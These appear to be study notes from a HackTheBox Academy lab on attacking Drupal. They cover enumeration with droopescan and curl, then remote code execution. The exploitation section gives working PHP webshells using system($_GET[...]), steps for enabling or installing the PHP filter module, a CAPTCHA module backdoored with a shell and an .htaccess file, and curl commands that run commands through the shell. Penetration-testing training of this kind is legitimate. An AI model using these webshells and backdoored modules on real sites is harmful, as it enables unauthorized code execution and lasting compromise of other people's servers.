### Footprinting + Enumeration
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal.inlanefreight.local/node/1
```
> [!NOTE] Note
> Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.

Trying this against the latest Drupal version will give a 404
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

### Exploitation
##### RCE before version 8.0
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

`Save configuration` -> `Content` -> `Add content` -> `Basic page`

Slap this bad boy in there (**avoid driveby shooters by using md5 hash**) and make sure the`Text format` drop-down is set to `PHP code`
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
Node number may vary
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
##### RCE 8.0 and up
From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first.
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Install the plugin (may be under the `Extend menu` depending on the Drupal version)

`Administration` -> `Reports` -> `Available updates` -> `Browse` -> Install

From there we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7. **Be sure to select `PHP code` from the `Text format` dropdown**

##### Uploading a Backdoor Module
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). 
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create a webshell
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
Create a `.htaccess` file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
Copy both files to the captcha folder and tar it up
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
Install: `Manage` -> `Extend` -> `+ Install new module` -> `Upload and Install`
Exploit
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
